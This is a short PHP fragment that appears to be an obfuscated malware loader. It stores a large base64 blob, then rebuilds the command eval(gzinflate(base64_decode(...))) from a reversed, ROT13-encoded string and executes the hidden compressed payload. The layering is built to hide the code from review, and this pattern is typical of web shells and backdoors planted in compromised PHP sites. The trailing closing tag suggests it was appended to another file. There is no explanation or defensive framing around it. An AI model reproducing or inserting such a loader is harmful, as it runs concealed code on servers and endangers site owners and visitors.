$CWBXLP='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';$ecnbav=';)))CYKOJP$(rqbprq_46rfno(rgnysavmt(ynir';$TMwJOe=strrev($ecnbav);$cDrWsZ=str_rot13($TMwJOe);eval($cDrWsZ);

?>